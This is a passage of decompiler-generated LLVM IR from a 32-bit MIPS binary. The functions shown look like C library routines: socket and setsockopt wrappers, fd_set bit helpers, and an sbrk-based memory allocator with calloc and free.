  %v5_405b98 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  %v3_405ba0 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405ba0, i32* @t9, align 4
  %v1_405ba4 = icmp eq i32* %arg4, null
  store i32 %v5_405b98, i32* %s0.global-to-local, align 4
  br i1 %v1_405ba4, label %dec_label_pc_405bc0, label %dec_label_pc_405ba8

dec_label_pc_405ba8:                              ; preds = %dec_label_pc_405b60
  %v1_405bac = call i32 @function_4055d0()
  %v0_405bb8 = load i32, i32* %s0.global-to-local, align 4
  %v2_405bb8 = inttoptr i32 %v1_405bac to i32*
  store i32 %v0_405bb8, i32* %v2_405bb8, align 4
  br label %dec_label_pc_405bc0

dec_label_pc_405bc0:                              ; preds = %dec_label_pc_405b60, %dec_label_pc_405ba8
  %v4_405bd0 = phi i32 [ %v5_405b98, %dec_label_pc_405b60 ], [ -1, %dec_label_pc_405ba8 ]
  ret i32 %v4_405bd0

; uselistorder directives
  uselistorder label %dec_label_pc_405bc0, { 1, 0 }
}

define i32 @function_405be0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405be0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @a1, align 4
  %v2_405c00 = load i32, i32* @a2, align 4
  %v3_405c00 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %v2_405c00)
  %v3_405c04 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405c04, i32* @t9, align 4
  %v0_405c08 = load i32, i32* @a3, align 4
  %v1_405c08 = icmp eq i32 %v0_405c08, 0
  store i32 %v3_405c00, i32* %s0.global-to-local, align 4
  br i1 %v1_405c08, label %dec_label_pc_405c24, label %dec_label_pc_405c0c

dec_label_pc_405c0c:                              ; preds = %dec_label_pc_405be0
  %v1_405c10 = call i32 @function_4055d0()
  %v0_405c1c = load i32, i32* %s0.global-to-local, align 4
  %v2_405c1c = inttoptr i32 %v1_405c10 to i32*
  store i32 %v0_405c1c, i32* %v2_405c1c, align 4
  br label %dec_label_pc_405c24

dec_label_pc_405c24:                              ; preds = %dec_label_pc_405be0, %dec_label_pc_405c0c
  %v4_405c2c = phi i32 [ %v3_405c00, %dec_label_pc_405be0 ], [ -1, %dec_label_pc_405c0c ]
  ret i32 %v4_405c2c

; uselistorder directives
  uselistorder label %dec_label_pc_405c24, { 1, 0 }
}

define i32 @function_405c40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405c40:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_405c54 = load i32, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_405c60 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* @s0, align 4
  br i1 %v2_405c60, label %dec_label_pc_405c78, label %dec_label_pc_405c64

dec_label_pc_405c64:                              ; preds = %dec_label_pc_405c40
  %v1_405c68 = icmp slt i32 %arg1, 1
  %v3_405c68 = icmp slt i32 %arg1, 128
  %v4_405c68 = zext i1 %v3_405c68 to i32
  store i32 %v4_405c68, i32* %v0.global-to-local, align 4
  br i1 %v1_405c68, label %dec_label_pc_405c78, label %dec_label_pc_405c6c

dec_label_pc_405c6c:                              ; preds = %dec_label_pc_405c64
  %v1_405c70 = icmp eq i1 %v3_405c68, false
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_405c70, label %dec_label_pc_405c78, label %dec_label_pc_405c9c

dec_label_pc_405c78:                              ; preds = %dec_label_pc_405c6c, %dec_label_pc_405c64, %dec_label_pc_405c40
  %v3_405c78 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_405c78, i32* @t9, align 4
  %v1_405c80 = call i32 @function_4055d0()
  store i32 %v1_405c80, i32* %v0.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_405c98 = inttoptr i32 %v1_405c80 to i32*
  store i32 22, i32* %v2_405c98, align 4
  %v0_405ca8.pre.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405c9c

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c6c, %dec_label_pc_405c78
  %v0_405ca8.pre = phi i32 [ %v4_405c68, %dec_label_pc_405c6c ], [ %v0_405ca8.pre.pre, %dec_label_pc_405c78 ]
  %v2_405c9c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_405c9c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405ca8

dec_label_pc_405ca8:                              ; preds = %dec_label_pc_405ca8, %dec_label_pc_405c9c
  %v0_405ca8 = phi i32 [ %v4_405cb4, %dec_label_pc_405ca8 ], [ %v0_405ca8.pre, %dec_label_pc_405c9c ]
  %v1_405ca8 = add i32 %v0_405ca8, 8
  %v2_405ca8 = inttoptr i32 %v1_405ca8 to i32*
  store i32 0, i32* %v2_405ca8, align 4
  %v0_405cac = load i32, i32* %v1.global-to-local, align 4
  %v1_405cac = add i32 %v0_405cac, -1
  store i32 %v1_405cac, i32* %v1.global-to-local, align 4
  %v1_405cb0 = mul i32 %v1_405cac, 4
  %v1_405cb4 = icmp sgt i32 %v1_405cac, -1
  %v3_405cb4 = load i32, i32* %a0.global-to-local, align 4
  %v4_405cb4 = add i32 %v3_405cb4, %v1_405cb0
  store i32 %v4_405cb4, i32* %v0.global-to-local, align 4
  br i1 %v1_405cb4, label %dec_label_pc_405ca8, label %dec_label_pc_405cb8

dec_label_pc_405cb8:                              ; preds = %dec_label_pc_405ca8
  %v2_405cc0 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_405cc0, i32* %a0.global-to-local, align 4
  %v1_405cc4 = load i32, i32* @s0, align 4
  %v4_405cc4 = call i32 @function_405d68(i32 %v2_405cc0, i32 %v1_405cc4)
  store i32 %v4_405cc4, i32* %v0.global-to-local, align 4
  %v1_405cd0 = icmp slt i32 %v4_405cc4, 0
  store i32 -1, i32* %a0.global-to-local, align 4
  br i1 %v1_405cd0, label %dec_label_pc_405d28, label %dec_label_pc_405cd4

dec_label_pc_405cd4:                              ; preds = %dec_label_pc_405cb8
  %v3_405cdc = load i32, i32* bitcast (i32** @global_var_449200.324 to i32*), align 4
  store i32 %v3_405cdc, i32* %a0.global-to-local, align 4
  %v1_405ce0 = load i32, i32* @s0, align 4
  %v4_405ce0 = call i32 @function_405d40(i32 %v3_405cdc, i32 %v1_405ce0)
  %v1_405cec = icmp eq i32 %v4_405ce0, 0
  %v1_405cf0 = select i1 %v1_405cec, i32 268435456, i32 0
  store i32 %v1_405cf0, i32* @v0, align 4
  %v3_405cf4 = load i32, i32* @global_var_4494b4.325, align 4
  store i32 %v3_405cf4, i32* @t9, align 4
  store i32 %v1_405cf0, i32* %stack_var_-296, align 4
  %v0_405cfc = load i32, i32* @s0, align 4
  store i32 %v0_405cfc, i32* %a0.global-to-local, align 4
  %v3_405d04 = ptrtoint i32* %stack_var_-152 to i32
  %v8_405d04 = call i32 @function_406d10(i32 %v0_405cfc, i32* nonnull %stack_var_-296, i32 %v3_405d04)
  store i32 %v8_405d04, i32* %v0.global-to-local, align 4
  %v1_405d10 = icmp slt i32 %v8_405d04, 0
  br i1 %v1_405d10, label %dec_label_pc_405d24, label %dec_label_pc_405d14

dec_label_pc_405d14:                              ; preds = %dec_label_pc_405cd4
  br label %dec_label_pc_405d24

dec_label_pc_405d24:                              ; preds = %dec_label_pc_405cd4, %dec_label_pc_405d14
  store i32 -1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405d28

dec_label_pc_405d28:                              ; preds = %dec_label_pc_405cb8, %dec_label_pc_405d24
  store i32 %v0_405c54, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_405cf0, { 1, 0 }
  uselistorder i32 %v4_405cb4, { 1, 0 }
  uselistorder i32 %v1_405cac, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 6, 7, 4, 5 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_405d28, { 1, 0 }
  uselistorder label %dec_label_pc_405d24, { 1, 0 }
  uselistorder label %dec_label_pc_405c9c, { 1, 0 }
}

define i32 @function_405d40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405d40:
  %v1_405d40 = add i32 %arg2, -1
  %v1_405d44 = udiv i32 %v1_405d40, 32
  %v1_405d48 = mul nuw nsw i32 %v1_405d44, 4
  %v2_405d4c = add i32 %v1_405d48, %arg1
  %v1_405d50 = inttoptr i32 %v2_405d4c to i32*
  %v2_405d50 = load i32, i32* %v1_405d50, align 4
  store i32 %v2_405d50, i32* @v1, align 4
  %v2_405d58 = shl i32 1, %v1_405d40
  %v2_405d5c = and i32 %v2_405d50, %v2_405d58
  %v2_405d60 = icmp ne i32 %v2_405d5c, 0
  %v3_405d60 = zext i1 %v2_405d60 to i32
  ret i32 %v3_405d60

; uselistorder directives
  uselistorder i32 %v1_405d40, { 1, 0 }
}

define i32 @function_405d68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405d68:
  %v1_405d68 = add i32 %arg2, -1
  %v1_405d6c = udiv i32 %v1_405d68, 32
  %v1_405d70 = mul nuw nsw i32 %v1_405d6c, 4
  %v2_405d74 = add i32 %v1_405d70, %arg1
  %v1_405d78 = inttoptr i32 %v2_405d74 to i32*
  %v2_405d78 = load i32, i32* %v1_405d78, align 4
  %v2_405d80 = shl i32 1, %v1_405d68
  %v2_405d84 = or i32 %v2_405d78, %v2_405d80
  store i32 %v2_405d84, i32* %v1_405d78, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_405d68, { 1, 0 }
}

define i32 @function_405d94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405d94:
  %v1_405d94 = add i32 %arg2, -1
  %v1_405d98 = udiv i32 %v1_405d94, 32
  %v1_405d9c = mul nuw nsw i32 %v1_405d98, 4
  %v2_405da0 = add i32 %v1_405d9c, %arg1
  %v1_405da8 = inttoptr i32 %v2_405da0 to i32*
  %v2_405da8 = load i32, i32* %v1_405da8, align 4
  %tmp = shl i32 -1, %v1_405d94
  %v1_405db0 = add i32 %tmp, -1
  %v2_405db4 = and i32 %v2_405da8, %v1_405db0
  store i32 %v2_405db4, i32* %v1_405da8, align 4
  ret i32 0
}

define i32 @function_405dd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dd0:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_405dd8 = load i32, i32* @t9, align 4
  %v2_405dd8 = add i32 %v1_405dd8, 308224
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v0_405de4 = load i32, i32* @s1, align 4
  %v0_405de8 = load i32, i32* @s0, align 4
  %v0_405df0 = load i32, i32* %a0.global-to-local, align 4
  %v1_405df0 = icmp eq i32 %v0_405df0, 0
  %v3_405df0 = icmp ult i32 %v0_405df0, -7
  %v4_405df0 = zext i1 %v3_405df0 to i32
  store i32 %v4_405df0, i32* %v0.global-to-local, align 4
  br i1 %v1_405df0, label %dec_label_pc_405df4, label %dec_label_pc_405e00

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dd0
  store i32 1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405e00

dec_label_pc_405e00:                              ; preds = %dec_label_pc_405dd0, %dec_label_pc_405df4
  %v0_405e0c = phi i32 [ %v0_405df0, %dec_label_pc_405dd0 ], [ 1, %dec_label_pc_405df4 ]
  %v1_405e00 = icmp eq i1 %v3_405df0, false
  br i1 %v1_405e00, label %dec_label_pc_405f88, label %dec_label_pc_405e04

dec_label_pc_405e04:                              ; preds = %dec_label_pc_405e00
  %v1_405e0c = add i32 %v0_405e0c, 4
  store i32 %v1_405e0c, i32* %v0.global-to-local, align 4
  %v3_405e10 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  store i32 %v3_405e10, i32* %a0.global-to-local, align 4
  store i32 %v1_405e0c, i32* %stack_var_-24, align 4
  %v6_405e14 = call i32 @function_406884(i32 %v3_405e10)
  store i32 %v6_405e14, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v3_405e28 = load i32, i32* bitcast (i32*** @global_var_449430.330 to i32*), align 4
  store i32 %v3_405e28, i32* %a0.global-to-local, align 4
  %v3_405e2c = ptrtoint i32* %stack_var_-24 to i32
  %tmp11 = inttoptr i32 %v3_405e28 to i32*
  %v8_405e2c = call i32 @function_406210(i32* %tmp11, i32 %v3_405e2c)
  store i32 %v8_405e2c, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406884.308 to i32), i32* @t9, align 4
  %v3_405e40 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  store i32 %v3_405e40, i32* %a0.global-to-local, align 4
  store i32 %v8_405e2c, i32* %s0.global-to-local, align 4
  %v3_405e44 = call i32 @function_406884(i32 %v3_405e40)
  store i32 %v3_405e44, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v1_405e50 = icmp eq i32 %v8_405e2c, 0
  br i1 %v1_405e50, label %dec_label_pc_405e54, label %dec_label_pc_405f70

dec_label_pc_405e54:                              ; preds = %dec_label_pc_405e04
  %v3_405e58 = load i32, i32* bitcast (i32** @global_var_4492f4.332 to i32*), align 4
  %v3_405e5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_405e58, i32* @s0, align 4
  %v2_405e68 = icmp ult i32 %v3_405e5c, %v3_405e58
  store i32 ptrtoint (i32* @global_var_4492f9.333 to i32), i32* %v0.global-to-local, align 4
  br i1 %v2_405e68, label %dec_label_pc_405e80, label %dec_label_pc_405e70

dec_label_pc_405e70:                              ; preds = %dec_label_pc_405e54
  store i32 ptrtoint (i32* @global_var_4492f8 to i32), i32* %v0.global-to-local, align 4
  %v1_405e78 = sub i32 0, %v3_405e58
  %v2_405e7c = and i32 %v1_405e78, ptrtoint (i32* @global_var_4492f8 to i32)
  store i32 %v2_405e7c, i32* @s0, align 4
  br label %dec_label_pc_405e80

dec_label_pc_405e80:                              ; preds = %dec_label_pc_405e54, %dec_label_pc_405e70
  %v3_405e84 = load i32, i32* bitcast (i32** @global_var_449318.335 to i32*), align 4
  store i32 %v3_405e84, i32* %a0.global-to-local, align 4
  %v2_405e88 = call i32 @function_406884(i32 %v3_405e84)
  store i32 %v2_405e88, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v3_405e98 = load i32, i32* @global_var_449488.336, align 4
  store i32 %v3_405e98, i32* @t9, align 4
  %v1_405ea0 = load i32, i32* @s0, align 4
  store i32 %v1_405ea0, i32* %a0.global-to-local, align 4
  %v3_405ea0 = call i32 @function_407460(i32 %v1_405ea0)
  store i32 %v3_405ea0, i32* @a2, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v2_405eb4 = icmp eq i32 %v3_405ea0, -1
  %v4_405eb4 = add i32 %v3_405ea0, 3
  br i1 %v2_405eb4, label %dec_label_pc_405eb8, label %dec_label_pc_405ec4

dec_label_pc_405eb8:                              ; preds = %dec_label_pc_405e80
  br label %dec_label_pc_405ec4

dec_label_pc_405ec4:                              ; preds = %dec_label_pc_405e80, %dec_label_pc_405eb8
  store i32 -4, i32* %v0.global-to-local, align 4
  %v2_405ec8 = and i32 %v4_405eb4, -4
  store i32 %v2_405ec8, i32* @s1, align 4
  %v2_405ecc = icmp eq i32 %v2_405ec8, %v3_405ea0
  br i1 %v2_405ecc, label %dec_label_pc_405eec, label %dec_label_pc_405ed0

dec_label_pc_405ed0:                              ; preds = %dec_label_pc_405ec4
  %v3_405ed4 = load i32, i32* @global_var_449488.336, align 4
  store i32 %v3_405ed4, i32* @t9, align 4
  %v3_405edc = sub i32 %v2_405ec8, %v3_405ea0
  store i32 %v3_405edc, i32* %a0.global-to-local, align 4
  %v5_405edc = call i32 @function_407460(i32 %v3_405edc)
  store i32 %v5_405edc, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_405eec

dec_label_pc_405eec:                              ; preds = %dec_label_pc_405ec4, %dec_label_pc_405ed0
  %v3_405ef0 = load i32, i32* bitcast (i32** @global_var_449318.335 to i32*), align 4
  store i32 %v3_405ef0, i32* %a0.global-to-local, align 4
  %v2_405ef4 = call i32 @function_406884(i32 %v3_405ef0)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v0_405f04 = load i32, i32* @s1, align 4
  %v2_405f04 = icmp eq i32 %v0_405f04, -1
  br i1 %v2_405f04, label %dec_label_pc_405f88, label %dec_label_pc_405f08

dec_label_pc_405f08:                              ; preds = %dec_label_pc_405eec
  %v3_405f10 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  store i32 %v3_405f10, i32* %a0.global-to-local, align 4
  %v2_405f14 = call i32 @function_406884(i32 %v3_405f10)
  store i32 %v2_405f14, i32* @v0, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v0_405f20 = load i32, i32* @s0, align 4
  %v3_405f24 = load i32, i32* @global_var_449470.337, align 4
  store i32 %v3_405f24, i32* @t9, align 4
  %v3_405f28 = load i32, i32* bitcast (i32*** @global_var_449430.330 to i32*), align 4
  store i32 %v3_405f28, i32* %a0.global-to-local, align 4
  %v1_405f2c = load i32, i32* @s1, align 4
  %tmp12 = inttoptr i32 %v3_405f28 to i32*
  %v7_405f2c = call i32 @function_406318(i32* %tmp12, i32 %v1_405f2c, i32 %v0_405f20)
  store i32 %v7_405f2c, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v3_405f40 = load i32, i32* bitcast (i32*** @global_var_449430.330 to i32*), align 4
  store i32 %v3_405f40, i32* %a0.global-to-local, align 4
  %tmp13 = inttoptr i32 %v3_405f40 to i32*
  %v8_405f44 = call i32 @function_406210(i32* %tmp13, i32 %v3_405e2c)
  store i32 %v8_405f44, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406884.308 to i32), i32* @t9, align 4
  %v3_405f58 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  store i32 %v3_405f58, i32* %a0.global-to-local, align 4
  store i32 %v8_405f44, i32* %s0.global-to-local, align 4
  %v3_405f5c = call i32 @function_406884(i32 %v3_405f58)
  store i32 %v3_405f5c, i32* %v0.global-to-local, align 4
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v1_405f68 = icmp eq i32 %v8_405f44, 0
  br i1 %v1_405f68, label %dec_label_pc_405f88, label %dec_label_pc_405f70

dec_label_pc_405f70:                              ; preds = %dec_label_pc_405f08, %dec_label_pc_405e04
  %v1_405f78 = phi i32 [ %v8_405f44, %dec_label_pc_405f08 ], [ %v8_405e2c, %dec_label_pc_405e04 ]
  %v3_405f70 = load i32, i32* %stack_var_-24, align 4
  %v2_405f78 = inttoptr i32 %v1_405f78 to i32*
  store i32 %v3_405f70, i32* %v2_405f78, align 4
  %v0_405f7c = load i32, i32* %s0.global-to-local, align 4
  %v1_405f7c = add i32 %v0_405f7c, 4
  store i32 %v1_405f7c, i32* %s0.global-to-local, align 4
  %v1_405f80 = icmp eq i32 %v1_405f7c, 0
  store i32 %v1_405f7c, i32* %v0.global-to-local, align 4
  br i1 %v1_405f80, label %dec_label_pc_405f70.dec_label_pc_405f88_crit_edge, label %dec_label_pc_405fa8

dec_label_pc_405f70.dec_label_pc_405f88_crit_edge: ; preds = %dec_label_pc_405f70
  %v0_405f88.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_405f88

dec_label_pc_405f88:                              ; preds = %dec_label_pc_405f70.dec_label_pc_405f88_crit_edge, %dec_label_pc_405f08, %dec_label_pc_405eec, %dec_label_pc_405e00
  %v0_405f88 = phi i32 [ %v0_405f88.pre, %dec_label_pc_405f70.dec_label_pc_405f88_crit_edge ], [ %v2_405dd8, %dec_label_pc_405f08 ], [ %v2_405dd8, %dec_label_pc_405eec ], [ %v2_405dd8, %dec_label_pc_405e00 ]
  %v1_405f88 = add i32 %v0_405f88, -32496
  %v2_405f88 = inttoptr i32 %v1_405f88 to i32*
  %v3_405f88 = load i32, i32* %v2_405f88, align 4
  store i32 %v3_405f88, i32* @t9, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_405f88)
  store i32 %v2_405dd8, i32* %gp.global-to-local, align 4
  %v1_405fa0 = load i32, i32* %v0.global-to-local, align 4
  %v2_405fa0 = inttoptr i32 %v1_405fa0 to i32*
  store i32 12, i32* %v2_405fa0, align 4
  %v0_405fa4 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405fa4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405fa8

dec_label_pc_405fa8:                              ; preds = %dec_label_pc_405f70, %dec_label_pc_405f88
  %v4_405fb4 = phi i32 [ %v1_405f7c, %dec_label_pc_405f70 ], [ %v0_405fa4, %dec_label_pc_405f88 ]
  store i32 %v0_405de4, i32* @s1, align 4
  store i32 %v0_405de8, i32* @s0, align 4
  ret i32 %v4_405fb4

; uselistorder directives
  uselistorder i32 %v8_405f44, { 1, 0, 2, 3 }
  uselistorder i32 %v2_405ec8, { 1, 0, 2 }
  uselistorder i32 %v3_405ea0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v8_405e2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_405dd8, { 3, 0, 1, 2, 13, 12, 11, 10, 9, 14, 8, 7, 6, 5, 4, 15 }
  uselistorder i32* %stack_var_-24, { 0, 1, 3, 2 }
  uselistorder i32* %v0.global-to-local, { 0, 15, 1, 2, 3, 4, 5, 8, 6, 7, 11, 9, 10, 12, 13, 17, 14, 16 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %gp.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_4492f8, { 1, 0 }
  uselistorder label %dec_label_pc_405fa8, { 1, 0 }
  uselistorder label %dec_label_pc_405eec, { 1, 0 }
  uselistorder label %dec_label_pc_405ec4, { 1, 0 }
  uselistorder label %dec_label_pc_405e80, { 1, 0 }
  uselistorder label %dec_label_pc_405e00, { 1, 0 }
}

define i32 @function_405fc0(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405fc0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg1 to i32
  %v3_405fe0 = sext i32 %arg2 to i64
  %v5_405fe0 = mul nsw i64 %v3_405fe0, %arg1
  %v6_405fe0 = trunc i64 %v5_405fe0 to i32
  %v3_405fe4 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v6_405fe0, i32* %s0.global-to-local, align 4
  %v2_405fec = icmp eq i32 %tmp, 0
  store i32 %v3_405fe4, i32* %v1.global-to-local, align 4
  br i1 %v2_405fec, label %dec_label_pc_406028, label %dec_label_pc_405ff0

dec_label_pc_405ff0:                              ; preds = %dec_label_pc_405fc0
  %v6_405ff4 = udiv i32 %v6_405fe0, %tmp
  %v3_406000 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_406000, i32* @t9, align 4
  store i32 %v6_405ff4, i32* @v0, align 4
  %v2_406008 = icmp eq i32 %v6_405ff4, %arg2
  store i32 0, i32* %s1.global-to-local, align 4
  br i1 %v2_406008, label %dec_label_pc_406028, label %dec_label_pc_40600c

dec_label_pc_40600c:                              ; preds = %dec_label_pc_405ff0
  %v1_406010 = call i32 @function_4055d0()
  store i32 %v1_406010, i32* @v0, align 4
  store i32 12, i32* %v1.global-to-local, align 4
  %v2_406024 = inttoptr i32 %v1_406010 to i32*
  store i32 12, i32* %v2_406024, align 4
  %v0_406028.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406028

dec_label_pc_406028:                              ; preds = %dec_label_pc_405ff0, %dec_label_pc_405fc0, %dec_label_pc_40600c
  %v0_406028 = phi i32 [ %v3_405fe4, %dec_label_pc_405ff0 ], [ %v3_405fe4, %dec_label_pc_405fc0 ], [ %v0_406028.pre, %dec_label_pc_40600c ]
  call void @__pseudo_call(i32 %v0_406028)
  %v0_406038 = load i32, i32* @v0, align 4
  store i32 %v0_406038, i32* %s1.global-to-local, align 4
  %v1_406048 = icmp eq i32 %v0_406038, 0
  br i1 %v1_406048, label %dec_label_pc_40605c, label %dec_label_pc_40604c

dec_label_pc_40604c:                              ; preds = %dec_label_pc_406028
  %v0_406040 = load i32, i32* %s0.global-to-local, align 4
  %v4_406050 = inttoptr i32 %v0_406038 to i32*
  %v5_406050 = call i32 @function_405660(i32* %v4_406050, i32 0, i32 %v0_406040)
  %v0_40605c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40605c

dec_label_pc_40605c:                              ; preds = %dec_label_pc_406028, %dec_label_pc_40604c
  %v0_40605c = phi i32 [ 0, %dec_label_pc_406028 ], [ %v0_40605c.pre, %dec_label_pc_40604c ]
  ret i32 %v0_40605c

; uselistorder directives
  uselistorder i32 %v0_406038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_40605c, { 1, 0 }
  uselistorder label %dec_label_pc_406028, { 2, 0, 1 }
}

define i32 @function_406080(i32 %arg1) local_unnamed_addr {
dec_label_pc_406080:
  %gp.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v1_406088 = load i32, i32* @t9, align 4
  %v2_406088 = add i32 %v1_406088, 307536
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v0_406090 = load i32, i32* @ra, align 4
  %v0_406094 = load i32, i32* @s2, align 4
  %v0_406098 = load i32, i32* @s1, align 4
  %v0_40609c = load i32, i32* @s0, align 4
  %v1_4060a4 = icmp eq i32 %arg1, 0
  br i1 %v1_4060a4, label %dec_label_pc_4061f4, label %dec_label_pc_4060a8

dec_label_pc_4060a8:                              ; preds = %dec_label_pc_406080
  %v3_4060b0 = load i32, i32* bitcast (i32** @global_var_449448.327 to i32*), align 4
  %v1_4060b4 = add i32 %arg1, -4
  %v2_4060b4 = inttoptr i32 %v1_4060b4 to i32*
  %v3_4060b4 = load i32, i32* %v2_4060b4, align 4
  store i32 %v3_4060b4, i32* @s1, align 4
  store i32 %v1_4060b4, i32* @s0, align 4
  %v4_4060b8 = call i32 @function_406884(i32 %v3_4060b0)
  store i32 %v4_4060b8, i32* @v0, align 4
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v3_4060c8 = load i32, i32* @global_var_449470.337, align 4
  store i32 %v3_4060c8, i32* @t9, align 4
  %v3_4060cc = load i32, i32* bitcast (i32*** @global_var_449430.330 to i32*), align 4
  %v0_4060d0 = load i32, i32* @s0, align 4
  %v1_4060d4 = load i32, i32* @s1, align 4
  %tmp9 = inttoptr i32 %v3_4060cc to i32*
  %v7_4060d4 = call i32 @function_406318(i32* %tmp9, i32 %v0_4060d0, i32 %v1_4060d4)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v1_4060e0 = inttoptr i32 %v7_4060d4 to i32*
  %v2_4060e0 = load i32, i32* %v1_4060e0, align 4
  store i32 %v2_4060e0, i32* %s2.global-to-local, align 4
  store i32 %v7_4060d4, i32* @s0, align 4
  %v3_4060e8 = load i32, i32* bitcast (i32** @global_var_4492f4.332 to i32*), align 4
  %v1_4060f8 = mul i32 %v3_4060e8, 8
  %v2_4060fc = icmp ult i32 %v2_4060e0, %v1_4060f8
  br i1 %v2_4060fc, label %dec_label_pc_406154, label %dec_label_pc_406104

dec_label_pc_406104:                              ; preds = %dec_label_pc_4060a8
  %v3_40610c = load i32, i32* bitcast (i32** @global_var_449318.335 to i32*), align 4
  %v2_406110 = add i32 %v7_4060d4, 12
  store i32 %v2_406110, i32* @s1, align 4
  %v4_406110 = call i32 @function_406884(i32 %v3_40610c)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v3_406120 = load i32, i32* @global_var_449488.336, align 4
  store i32 %v3_406120, i32* @t9, align 4
  %v2_406128 = call i32 @function_407460(i32 0)
  store i32 %v2_406088, i32* %gp.global-to-local, align 4
  %v0_406134 = load i32, i32* @s1, align 4
  %v2_406134 = icmp eq i32 %v0_406134, %v2_406128
  br i1 %v2_406134, label %dec_label_pc_406174, label %dec_label_pc_406138

dec_label_pc_406138:                              ; preds = %dec_label_pc_406104
  %v3_406140 = load i32, i32* bitcast (i32** @global_var_449318.335 to i32*), align 4
